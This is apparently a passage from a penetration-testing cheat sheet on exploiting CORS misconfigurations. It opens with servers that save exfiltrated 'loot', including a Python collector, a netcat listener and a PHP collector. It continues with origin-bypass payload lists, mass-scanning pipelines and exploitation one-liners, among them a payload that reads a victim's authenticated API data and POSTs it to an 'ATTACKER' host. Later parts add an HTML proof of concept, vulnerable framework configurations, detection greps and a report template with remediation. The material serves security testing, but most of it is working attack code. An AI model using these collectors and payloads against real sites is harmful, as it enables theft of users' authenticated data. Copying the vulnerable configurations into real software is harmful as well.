```python [cors_collector.py]
#!/usr/bin/env python3
"""Full-featured CORS data collection server with TLS"""

import ssl, json, datetime, os, sys
from http.server import HTTPServer, BaseHTTPRequestHandler
from urllib.parse import urlparse, parse_qs

LOOT_DIR = './loot'
os.makedirs(LOOT_DIR, exist_ok=True)

class Collector(BaseHTTPRequestHandler):
    def _set_cors(self):
        self.send_header('Access-Control-Allow-Origin', '*')
        self.send_header('Access-Control-Allow-Methods', 'GET, POST, PUT, DELETE, OPTIONS')
        self.send_header('Access-Control-Allow-Headers', 'Content-Type, Authorization, X-Requested-With')
        self.send_header('Access-Control-Allow-Credentials', 'true')

    def do_OPTIONS(self):
        self.send_response(200)
        self._set_cors()
        self.end_headers()

    def do_GET(self):
        query = parse_qs(urlparse(self.path).query)
        if query:
            self._save_loot('GET', str(query))
        self.send_response(200)
        self._set_cors()
        self.send_header('Content-Type', 'image/gif')
        self.end_headers()
        # 1x1 transparent GIF
        self.wfile.write(b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff\x00\x00\x00\x21\xf9\x04\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b')

    def do_POST(self):
        length = int(self.headers.get('Content-Length', 0))
        body = self.rfile.read(length).decode('utf-8', errors='replace')
        self._save_loot('POST', body)
        self.send_response(200)
        self._set_cors()
        self.end_headers()
        self.wfile.write(b'ok')

    def _save_loot(self, method, data):
        ts = datetime.datetime.now().strftime('%Y%m%d_%H%M%S_%f')
        filename = f"{LOOT_DIR}/loot_{ts}.json"
        entry = {
            'timestamp': ts,
            'method': method,
            'path': self.path,
            'client': self.client_address[0],
            'user_agent': self.headers.get('User-Agent', ''),
            'origin': self.headers.get('Origin', ''),
            'referer': self.headers.get('Referer', ''),
            'data': data
        }
        with open(filename, 'w') as f:
            json.dump(entry, f, indent=2)
        
        # Also append to master log
        with open(f"{LOOT_DIR}/master_log.jsonl", 'a') as f:
            f.write(json.dumps(entry) + '\n')
        
        # Pretty print to console
        try:
            parsed = json.loads(data)
            print(f"\033[92m[+] [{ts}] {method} from {self.client_address[0]}\033[0m")
            print(json.dumps(parsed, indent=2)[:1000])
        except:
            print(f"\033[92m[+] [{ts}] {method}: {data[:500]}\033[0m")
        print('─' * 60)

    def log_message(self, format, *args):
        pass  # Suppress default logging

if __name__ == '__main__':
    port = int(sys.argv[1]) if len(sys.argv) > 1 else 443
    server = HTTPServer(('0.0.0.0', port), Collector)
    
    if port == 443 or port == 8443:
        if not os.path.exists('cert.pem'):
            os.system('openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes -subj "/CN=attacker.com" 2>/dev/null')
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_SERVER)
        ctx.load_cert_chain('cert.pem', 'key.pem')
        server.socket = ctx.wrap_socket(server.socket)
    
    print(f'\033[92m[*] CORS Collector listening on :{port}\033[0m')
    print(f'[*] Loot directory: {LOOT_DIR}/')
    server.serve_forever()
```

```bash [Netcat One-liner]
# Quick listener for testing
while true; do
  echo -e "HTTP/1.1 200 OK\r\nAccess-Control-Allow-Origin: *\r\nAccess-Control-Allow-Methods: POST,GET,OPTIONS\r\nAccess-Control-Allow-Headers: Content-Type\r\nContent-Length: 2\r\n\r\nOK" | nc -lvnp 8080 2>&1 | tee -a loot.txt
done
```

```bash [PHP Collector]
# collector.php - one-file collector
cat << 'EOF' > collector.php
<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') { http_response_code(200); exit; }

$data = [
    'time' => date('c'),
    'ip' => $_SERVER['REMOTE_ADDR'],
    'method' => $_SERVER['REQUEST_METHOD'],
    'body' => file_get_contents('php://input'),
    'get' => $_GET,
    'headers' => getallheaders()
];

file_put_contents('loot.jsonl', json_encode($data) . "\n", FILE_APPEND);
echo 'ok';
EOF
php -S 0.0.0.0:8080 collector.php
```

```bash [Ngrok + Interactsh]
# Ngrok tunnel for HTTPS
ngrok http 8443 --scheme https --log=stdout

# Interactsh for OOB detection
interactsh-client -v -o cors-oob.txt

# Pipedream for quick webhook
echo "[*] Use https://pipedream.com or https://webhook.site for quick receivers"
```

::

## Burp Suite Integration

::tabs
  :::tabs-item{icon="i-lucide-settings" label="Match & Replace Rules"}

  | Type | Match | Replace | Purpose |
  | ---- | ----- | ------- | ------- |
  | Request Header | `` | `Origin: https://evil.com` | Inject origin into all requests |
  | Request Header | `Origin: .*` | `Origin: https://evil.com` | Override existing origin |
  | Request Header | `` | `Origin: null` | Test null origin |
  | Request Header | `Referer: .*` | `Referer: https://evil.com` | Match referer validation |

  :::

  :::tabs-item{icon="i-lucide-list" label="Intruder Setup"}

  **Request Template:**
  ```http
  GET /api/user/profile HTTP/1.1
  Host: target.com
  Origin: §origin_payload§
  Cookie: session=valid_session_token
  Authorization: Bearer valid_jwt_token
  Connection: close
  ```

  **Payload Positions:** Sniper mode on `§origin_payload§`

  **Payload List (origin-payloads.txt):**
  - `https://evil.com`
  - `https://attacker.xyz`
  - `null`
  - `https://target.com.evil.com`
  - `https://evil-target.com`
  - `https://eviltarget.com`
  - `http://target.com`
  - `https://target.com@evil.com`
  - `https://target.com%00.evil.com`
  - `https://target.com%60.evil.com`
  - `https://sub.target.com`
  - `https://target.com_.evil.com`
  - `https://evil.com#.target.com`
  - `https://evil.com?.target.com`
  - `https://target.com:evil.com`
  - `https://target.com\\.evil.com`
  - `https://target.com..evil.com`
  - ``
  - `https://`

  **Grep Extract Rules:**
  - `Access-Control-Allow-Origin: (.*)$`
  - `Access-Control-Allow-Credentials: (.*)$`
  - `Access-Control-Allow-Methods: (.*)$`
  - `Access-Control-Allow-Headers: (.*)$`

  :::

  :::tabs-item{icon="i-lucide-scan" label="Scanner Extensions"}

  ::code-preview
  Install and configure CORS-related Burp extensions.

  #code
  ```
  BApp Store Extensions for CORS:
  
  1. CORS* (Additional CORS Checks)
     - Passive scanner for CORS misconfigs
     - Detects reflected origins
     - Checks credential combinations
  
  2. Autorize
     - Add "Origin: https://evil.com" to enforced headers
     - Detects CORS bypass in authorization testing
  
  3. Additional Scanner Checks
     - Includes CORS reflection detection
     - Passive + Active scanning
  
  4. Hackvertor
     - Tag-based encoding for origin payloads
     - Use <@base64>evil.com<@/base64> style transforms
  
  5. Logger++
     - Filter: "Response.headers CONTAINS 'Access-Control-Allow-Credentials: true'"
     - Monitor all CORS headers across testing
  ```
  ::

  :::

  :::tabs-item{icon="i-lucide-code" label="Burp Macro for CORS"}

  ::code-preview
  Burp Collaborator-based CORS detection macro.

  #code
  ```
  Session Handling Rules:
  
  1. Scope: Target scope only
  2. Rule Action: Run macro
  3. Macro Steps:
     a. Send request with Origin: <collaborator-domain>
     b. Check response for ACAO header reflection
     c. If reflected + ACAC:true → flag as critical
  
  Manual Collaborator Test:
  
  1. Generate Collaborator payload: xxx.burpcollaborator.net
  2. Send: Origin: https://xxx.burpcollaborator.net
  3. Check if ACAO reflects the Collaborator domain
  4. If yes → confirmed reflection, no DNS/HTTP interaction needed
  ```
  ::

  :::
::

## Nuclei Custom Templates

::code-tree{default-value="cors-full-reflection.yaml"}

```yaml [cors-full-reflection.yaml]
id: cors-full-origin-reflection

info:
  name: CORS Full Origin Reflection with Credentials
  author: pentester
  severity: critical
  description: Server reflects any arbitrary origin with credentials enabled
  tags: cors,misconfiguration
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N
    cvss-score: 8.1
    cwe-id: CWE-942

http:
  - raw:
      - |
        GET {{Path}} HTTP/1.1
        Host: {{Hostname}}
        Origin: https://cors-evil-test-{{rand_int(1000,9999)}}.com

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "cors-evil-test-"
        condition: and

      - type: word
        part: header
        words:
          - "Access-Control-Allow-Credentials: true"

    extractors:
      - type: kval
        kval:
          - access_control_allow_origin
          - access_control_allow_credentials
```

```yaml [cors-null-origin.yaml]
id: cors-null-origin-credentials

info:
  name: CORS Null Origin with Credentials
  author: pentester
  severity: critical
  description: Server accepts null origin with credentials
  tags: cors,misconfiguration
  classification:
    cwe-id: CWE-942

http:
  - raw:
      - |
        GET {{Path}} HTTP/1.1
        Host: {{Hostname}}
        Origin: null

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "Access-Control-Allow-Origin: null"

      - type: word
        part: header
        words:
          - "Access-Control-Allow-Credentials: true"
```

```yaml [cors-regex-bypass.yaml]
id: cors-regex-bypass

info:
  name: CORS Regex Bypass with Credentials
  author: pentester
  severity: high
  description: Server uses weak regex for origin validation
  tags: cors,misconfiguration

http:
  - raw:
      - |
        GET {{Path}} HTTP/1.1
        Host: {{Hostname}}
        Origin: https://{{Hostname}}.evil-cors-test.com

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "evil-cors-test.com"

      - type: word
        part: header
        words:
          - "Access-Control-Allow-Credentials: true"
```

```yaml [cors-protocol-downgrade.yaml]
id: cors-http-origin-accepted

info:
  name: CORS HTTP Origin Accepted (Protocol Downgrade)
  author: pentester
  severity: high
  description: HTTPS endpoint accepts HTTP origin with credentials
  tags: cors,misconfiguration

http:
  - raw:
      - |
        GET {{Path}} HTTP/1.1
        Host: {{Hostname}}
        Origin: http://{{Hostname}}

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "Access-Control-Allow-Origin: http://"

      - type: word
        part: header
        words:
          - "Access-Control-Allow-Credentials: true"
```

```yaml [cors-vary-missing.yaml]
id: cors-missing-vary-header

info:
  name: CORS Missing Vary Origin Header (Cache Poisoning Risk)
  author: pentester
  severity: medium
  description: CORS response lacks Vary Origin header enabling cache poisoning
  tags: cors,cache-poisoning

http:
  - raw:
      - |
        GET {{Path}} HTTP/1.1
        Host: {{Hostname}}
        Origin: https://vary-test.evil.com

    matchers-condition: and
    matchers:
      - type: word
        part: header
        words:
          - "Access-Control-Allow-Origin:"

      - type: word
        part: header
        words:
          - "Vary:"
        negative: true

      - type: word
        part: header
        words:
          - "Cache-Control:"
```

::

## Complete One-Liner Reference

::tabs
  :::tabs-item{icon="i-lucide-terminal" label="Detection One-Liners"}

  ::code-group

  ```bash [Arbitrary Origin]
  curl -sI -H "Origin: https://evil.com" https://target.com/api/me | grep -iE "access-control"
  ```

  ```bash [Null Origin]
  curl -sI -H "Origin: null" https://target.com/api/me | grep -iE "access-control"
  ```

  ```bash [Protocol Downgrade]
  curl -sI -H "Origin: http://target.com" https://target.com/api/me | grep -iE "access-control"
  ```

  ```bash [Subdomain Trust]
  curl -sI -H "Origin: https://evil.target.com" https://target.com/api/me | grep -iE "access-control"
  ```

  ```bash [Suffix Bypass]
  curl -sI -H "Origin: https://target.com.evil.com" https://target.com/api/me | grep -iE "access-control"
  ```

  ```bash [Prefix Bypass]
  curl -sI -H "Origin: https://eviltarget.com" https://target.com/api/me | grep -iE "access-control"
  ```

  ```bash [Null Byte]
  curl -sI -H "Origin: https://target.com%00.evil.com" https://target.com/api/me | grep -iE "access-control"
  ```

  ```bash [At-Sign Bypass]
  curl -sI -H "Origin: https://target.com@evil.com" https://target.com/api/me | grep -iE "access-control"
  ```

  ```bash [Full Preflight]
  curl -v -X OPTIONS -H "Origin: https://evil.com" -H "Access-Control-Request-Method: DELETE" -H "Access-Control-Request-Headers: Authorization" https://target.com/api/me 2>&1 | grep -i "access-control"
  ```

  ::

  :::

  :::tabs-item{icon="i-lucide-terminal" label="Mass Scanning One-Liners"}

  ::code-group

  ```bash [httpx Pipeline]
  cat urls.txt | httpx -H "Origin: https://evil.com" -match-string "Access-Control-Allow-Origin: https://evil.com" -mc 200 -silent
  ```

  ```bash [Parallel Curl]
  cat endpoints.txt | xargs -I{} -P30 sh -c 'r=$(curl -sI -H "Origin: https://evil.com" "{}" 2>/dev/null | grep -i "Access-Control-Allow-Credentials: true"); [ -n "$r" ] && echo "[VULN] {}"'
  ```

  ```bash [Nuclei Mass Scan]
  nuclei -l targets.txt -tags cors -severity critical,high -H "Cookie: session=val" -rate-limit 100 -o cors-hits.txt
  ```

  ```bash [GAU + CORS Check]
  gau target.com --threads 5 | grep -iE "/api/|/v[0-9]/" | sort -u | httpx -H "Origin: https://evil.com" -match-string "evil.com" -silent
  ```

  ```bash [Subfinder + CORS]
  subfinder -d target.com -silent | httpx -silent | while read url; do curl -sI -H "Origin: https://evil.com" "$url/api/user" | grep -qi "evil.com" && echo "[VULN] $url"; done
  ```

  ```bash [Wayback + CORS]
  waybackurls target.com | grep -iE "api|user|account|admin|config|setting" | sort -u | httpx -H "Origin: https://evil.com" -match-string "evil.com" -mc 200
  ```

  ::

  :::

  :::tabs-item{icon="i-lucide-terminal" label="Exploitation One-Liners"}

  ::code-group

  ```bash [Quick PoC Generator]
  echo '<html><body><script>fetch("https://TARGET/api/user/profile",{credentials:"include"}).then(r=>r.text()).then(d=>document.write("<pre>"+d+"</pre>"))</script></body></html>' > poc.html && python3 -m http.server 8080
  ```

  ```bash [Inline Exfil Server]
  python3 -c "from http.server import*;h=type('H',(BaseHTTPRequestHandler,),{'do_POST':lambda s:(s.send_response(200),s.send_header('Access-Control-Allow-Origin','*'),s.end_headers(),print(s.rfile.read(int(s.headers['Content-Length'])).decode())),'do_OPTIONS':lambda s:(s.send_response(200),s.send_header('Access-Control-Allow-Origin','*'),s.send_header('Access-Control-Allow-Headers','*'),s.end_headers())});HTTPServer(('',8443),h).serve_forever()"
  ```

  ```bash [Base64 PoC]
  echo -n '<script>fetch("https://TARGET/api/me",{credentials:"include"}).then(r=>r.text()).then(d=>fetch("https://ATTACKER/c",{method:"POST",body:d}))</script>' | base64 -w0 | xargs -I{} echo 'data:text/html;base64,{}'
  ```

  ```bash [Curl-Based Verification]
  curl -s -H "Origin: https://evil.com" -H "Cookie: session=VICTIM_TOKEN" https://target.com/api/user/profile -D- | head -20 && echo "---BODY---" && curl -s -H "Origin: https://evil.com" -H "Cookie: session=VICTIM_TOKEN" https://target.com/api/user/profile | python3 -m json.tool
  ```

  ::

  :::
::

## CORS Header Cheat Sheet

::collapsible

| Header | Dangerous Value | Why Dangerous | Safe Value |
| ------ | -------------- | ------------- | ---------- |
| `Access-Control-Allow-Origin` | `*` (reflected) | Any origin can read responses | Explicit allowlist |
| `Access-Control-Allow-Origin` | `null` | Exploitable via sandboxed contexts | Never allow null |
| `Access-Control-Allow-Credentials` | `true` (with reflected origin) | Cookies sent cross-origin | Only with strict allowlist |
| `Access-Control-Allow-Methods` | `GET, POST, PUT, DELETE, PATCH` | State-changing methods exposed | Minimum required methods |
| `Access-Control-Allow-Headers` | `*` or `Authorization, X-CSRF-Token` | Custom auth headers cross-origin | Minimum required headers |
| `Access-Control-Max-Age` | `86400` (24h) | Long preflight cache | Short values (600) |
| `Access-Control-Expose-Headers` | `Authorization, Set-Cookie` | Sensitive headers readable by JS | Minimum exposure |
| `Vary` | Missing when ACAO is dynamic | Cache poisoning possible | Always include `Vary: Origin` |

::

## Framework-Specific Misconfigurations

::accordion
  :::accordion-item{icon="i-lucide-code" label="Express.js (Node.js) — cors middleware"}
  ```javascript
  // VULNERABLE - reflects any origin
  app.use(cors({
    origin: true,           // Reflects request origin
    credentials: true       // Allows cookies
  }));

  // VULNERABLE - callback always allows
  app.use(cors({
    origin: function(origin, callback) {
      callback(null, true);  // Always allows
    },
    credentials: true
  }));

  // VULNERABLE - regex too broad
  app.use(cors({
    origin: /target\.com/,  // Matches target.com.evil.com
    credentials: true
  }));
  ```

  **Detection Command:**
  ```bash
  grep -rn "cors(" --include="*.js" --include="*.ts" | grep -iE "(origin.*true|credentials.*true|callback.*null.*true)"
  ```
  :::

  :::accordion-item{icon="i-lucide-code" label="Django (Python) — django-cors-headers"}
  ```python
  # VULNERABLE - allows all origins with credentials
  CORS_ALLOW_ALL_ORIGINS = True
  CORS_ALLOW_CREDENTIALS = True

  # VULNERABLE - regex too broad
  CORS_ALLOWED_ORIGIN_REGEXES = [
      r"^https://.*target\.com$",  # Matches evil-target.com
  ]
  CORS_ALLOW_CREDENTIALS = True
  ```

  **Detection Command:**
  ```bash
  grep -rn "CORS_ALLOW" --include="*.py" | grep -iE "(ALL_ORIGINS.*True|CREDENTIALS.*True)"
  ```
  :::

  :::accordion-item{icon="i-lucide-code" label="Flask (Python) — flask-cors"}
  ```python
  # VULNERABLE
  CORS(app, supports_credentials=True, origins="*")

  # VULNERABLE - reflects origin
  @app.after_request
  def add_cors(response):
      origin = request.headers.get('Origin')
      response.headers['Access-Control-Allow-Origin'] = origin
      response.headers['Access-Control-Allow-Credentials'] = 'true'
      return response
  ```

  **Detection Command:**
  ```bash
  grep -rn "supports_credentials\|Access-Control-Allow-Origin.*origin\|CORS.*origins" --include="*.py"
  ```
  :::

  :::accordion-item{icon="i-lucide-code" label="Spring Boot (Java)"}
  ```java
  // VULNERABLE - allows all origins
  @CrossOrigin(origins = "*", allowCredentials = "true")

  // VULNERABLE - global config
  @Bean
  public WebMvcConfigurer corsConfigurer() {
      return new WebMvcConfigurer() {
          @Override
          public void addCorsMappings(CorsRegistry registry) {
              registry.addMapping("/api/**")
                  .allowedOrigins("*")  // or .allowedOriginPatterns("*")
                  .allowCredentials(true);
          }
      };
  }
  ```

  **Detection Command:**
  ```bash
  grep -rn "CrossOrigin\|allowedOrigin\|allowCredentials" --include="*.java" | grep -iE '(\*|true)'
  ```
  :::

  :::accordion-item{icon="i-lucide-code" label="Nginx / Apache Configuration"}
  ```nginx
  # VULNERABLE Nginx - reflects $http_origin
  location /api/ {
      if ($http_origin) {
          add_header Access-Control-Allow-Origin $http_origin;
          add_header Access-Control-Allow-Credentials true;
      }
  }
  ```

  ```apache
  # VULNERABLE Apache - reflects origin via env
  SetEnvIf Origin ".*" ORIGIN=$0
  Header set Access-Control-Allow-Origin %{ORIGIN}e
  Header set Access-Control-Allow-Credentials "true"
  ```

  **Detection Command:**
  ```bash
  grep -rn "http_origin\|Access-Control-Allow-Origin.*\$\|ORIGIN.*env" /etc/nginx/ /etc/apache2/ /etc/httpd/ 2>/dev/null
  ```
  :::

  :::accordion-item{icon="i-lucide-code" label="ASP.NET Core"}
  ```csharp
  // VULNERABLE
  builder.Services.AddCors(options =>
  {
      options.AddPolicy("AllowAll", policy =>
      {
          policy.AllowAnyOrigin()       // or .SetIsOriginAllowed(_ => true)
                .AllowCredentials()
                .AllowAnyMethod()
                .AllowAnyHeader();
      });
  });
  ```

  **Detection Command:**
  ```bash
  grep -rn "AllowAnyOrigin\|SetIsOriginAllowed\|AllowCredentials" --include="*.cs"
  ```
  :::

  :::accordion-item{icon="i-lucide-code" label="Ruby on Rails — rack-cors"}
  ```ruby
  # VULNERABLE
  config.middleware.insert_before 0, Rack::Cors do
    allow do
      origins '*'
      resource '*',
        headers: :any,
        methods: [:get, :post, :put, :delete],
        credentials: true
    end
  end
  ```

  **Detection Command:**
  ```bash
  grep -rn "origins\|credentials" --include="*.rb" | grep -iE "(\*|true)"
  ```
  :::

  :::accordion-item{icon="i-lucide-code" label="Go — rs/cors"}
  ```go
  // VULNERABLE
  c := cors.New(cors.Options{
      AllowedOrigins:   []string{"*"},
      AllowCredentials: true,
      AllowedMethods:   []string{"GET", "POST", "PUT", "DELETE"},
  })

  // VULNERABLE - custom AllowOriginFunc
  c := cors.New(cors.Options{
      AllowOriginFunc: func(origin string) bool {
          return true // Allows everything
      },
      AllowCredentials: true,
  })
  ```

  **Detection Command:**
  ```bash
  grep -rn "AllowedOrigins\|AllowCredentials\|AllowOriginFunc" --include="*.go" | grep -iE '(\*|true)'
  ```
  :::
::

## Validation & Proof of Concept Generation

::steps{level="4"}

#### Confirm vulnerability with authenticated request

```bash
# Replace with actual session cookie
SESSION="session=eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWRtaW4ifQ.valid"

echo "[1] Testing arbitrary origin reflection..."
curl -s -D- \
  -H "Origin: https://cors-poc-$(date +%s).evil.com" \
  -H "Cookie: $SESSION" \
  https://target.com/api/user/profile | head -25

echo ""
echo "[2] Testing null origin..."
curl -s -D- \
  -H "Origin: null" \
  -H "Cookie: $SESSION" \
  https://target.com/api/user/profile | head -25
```

#### Verify sensitive data exposure in response body

```bash
curl -s \
  -H "Origin: https://evil.com" \
  -H "Cookie: $SESSION" \
  https://target.com/api/user/profile | python3 -c "
import sys, json
try:
    data = json.load(sys.stdin)
    sensitive_keys = ['password','token','key','secret','ssn','credit','api_key','private','auth','session','jwt','bearer','access_token','refresh_token']
    print('[*] Response fields:')
    def check(obj, path=''):
        if isinstance(obj, dict):
            for k,v in obj.items():
                full = f'{path}.{k}' if path else k
                if any(s in k.lower() for s in sensitive_keys):
                    print(f'  \033[91m[SENSITIVE] {full} = {str(v)[:100]}\033[0m')
                else:
                    print(f'  {full} = {str(v)[:80]}')
                check(v, full)
        elif isinstance(obj, list) and obj:
            check(obj[0], f'{path}[0]')
    check(data)
except Exception as e:
    print(f'Raw response: {sys.stdin.read()[:500]}')
"
```

#### Generate standalone HTML proof of concept

```bash
TARGET_URL="https://target.com/api/user/profile"
cat << POCEOF > cors_poc_$(date +%Y%m%d).html
<!DOCTYPE html>
<html>
<head>
  <title>CORS Misconfiguration - Proof of Concept</title>
  <style>
    body { font-family: monospace; background: #1a1a2e; color: #e94560; padding: 20px; }
    h1 { color: #0f3460; }
    pre { background: #16213e; padding: 15px; border-radius: 5px; color: #e94560; overflow-x: auto; }
    .info { color: #53a8b6; }
    .success { color: #00ff41; }
    .error { color: #ff0000; }
    #status { font-size: 14px; }
  </style>
</head>
<body>
  <h1>CORS Wildcard Origin + Credentials PoC</h1>
  <p class="info">Target: ${TARGET_URL}</p>
  <p class="info">Date: $(date -Iseconds)</p>
  <p id="status">Status: Sending authenticated cross-origin request...</p>
  <h2>Stolen Response:</h2>
  <pre id="result">Waiting...</pre>
  <h2>Response Headers:</h2>
  <pre id="headers">Waiting...</pre>
  
  <script>
  (async function() {
    const statusEl = document.getElementById('status');
    const resultEl = document.getElementById('result');
    const headersEl = document.getElementById('headers');
    
    try {
      const resp = await fetch('${TARGET_URL}', {
        credentials: 'include',
        mode: 'cors'
      });
      
      // Capture headers
      let hdrs = {};
      resp.headers.forEach((v, k) => hdrs[k] = v);
      headersEl.textContent = JSON.stringify(hdrs, null, 2);
      
      const body = await resp.text();
      
      try {
        resultEl.textContent = JSON.stringify(JSON.parse(body), null, 2);
      } catch(e) {
        resultEl.textContent = body;
      }
      
      statusEl.innerHTML = '<span class="success">SUCCESS - Cross-origin data read with victim credentials!</span>';
      statusEl.innerHTML += '<br>HTTP Status: ' + resp.status;
      statusEl.innerHTML += '<br>Content-Type: ' + resp.headers.get('content-type');
      statusEl.innerHTML += '<br>ACAO: ' + resp.headers.get('access-control-allow-origin');
      
    } catch(e) {
      statusEl.innerHTML = '<span class="error">BLOCKED - ' + e.message + '</span>';
      resultEl.textContent = 'Cross-origin request was blocked by the browser.';
    }
  })();
  </script>
</body>
</html>
POCEOF

echo "[+] PoC saved: cors_poc_$(date +%Y%m%d).html"
echo "[+] Serve with: python3 -m http.server 8080"
echo "[+] Or use: ngrok http 8080 --scheme https"
```

#### Capture evidence with screenshots and logs

```bash
# Automated evidence capture
echo "[*] Capturing evidence..."

# Save curl output as evidence
curl -v -H "Origin: https://evil.com" \
  -H "Cookie: $SESSION" \
  https://target.com/api/user/profile \
  2> evidence_headers.txt \
  1> evidence_body.json

echo "[+] Headers saved: evidence_headers.txt"
echo "[+] Body saved: evidence_body.json"

# Generate summary
echo "=== CORS VULNERABILITY EVIDENCE ===" > evidence_summary.txt
echo "Date: $(date -Iseconds)" >> evidence_summary.txt
echo "Target: https://target.com/api/user/profile" >> evidence_summary.txt
echo "" >> evidence_summary.txt
echo "=== RESPONSE HEADERS ===" >> evidence_summary.txt
grep -i "access-control" evidence_headers.txt >> evidence_summary.txt
echo "" >> evidence_summary.txt
echo "=== SENSITIVE DATA EXPOSED ===" >> evidence_summary.txt
python3 -m json.tool evidence_body.json >> evidence_summary.txt 2>/dev/null || cat evidence_body.json >> evidence_summary.txt

echo "[+] Summary: evidence_summary.txt"
```

::

## Reporting Template

::field-group
  :::field{name="Title" type="string"}
  Cross-Origin Resource Sharing (CORS) — Wildcard Origin Reflection with Credentials
  :::

  :::field{name="Severity" type="string"}
  **Critical** (CVSS 3.1: 8.1 — AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:N)
  :::

  :::field{name="CWE Classification" type="string"}
  CWE-942: Permissive Cross-domain Policy with Untrusted Domains
  :::

  :::field{name="OWASP Mapping" type="string"}
  API7:2023 Server Side Request Forgery · A05:2021 Security Misconfiguration
  :::

  :::field{name="Affected Endpoints" type="string"}
  All API endpoints returning `Access-Control-Allow-Credentials: true` with reflected `Origin`
  :::

  :::field{name="Attack Vector" type="string"}
  Attacker hosts malicious page → victim visits while authenticated → JavaScript reads authenticated API responses cross-origin → data exfiltrated to attacker
  :::

  :::field{name="Impact" type="string"}
  Complete authenticated data theft (PII, tokens, API keys) · Account takeover via password/email change · Privilege escalation · Mass data exfiltration · Persistent backdoor installation
  :::

  :::field{name="Proof of Concept" type="string"}
  See attached `cors_poc.html` — when visited by authenticated user, reads `/api/user/profile` cross-origin and displays stolen data
  :::

  :::field{name="Remediation" type="string"}
  1. Implement strict origin allowlist — never reflect arbitrary origins
  2. Never allow `null` origin with credentials
  3. Use exact string matching, not regex containing patterns
  4. Validate protocol (reject `http://` origins for HTTPS APIs)
  5. Always include `Vary: Origin` header when ACAO is dynamic
  6. Minimize `Access-Control-Allow-Methods` to required methods only
  7. Set short `Access-Control-Max-Age` values
  8. Review framework CORS middleware configuration
  :::

  :::field{name="References" type="string"}
  PortSwigger CORS Research · OWASP CORS Testing Guide · MDN CORS Documentation · CWE-942
  :::
::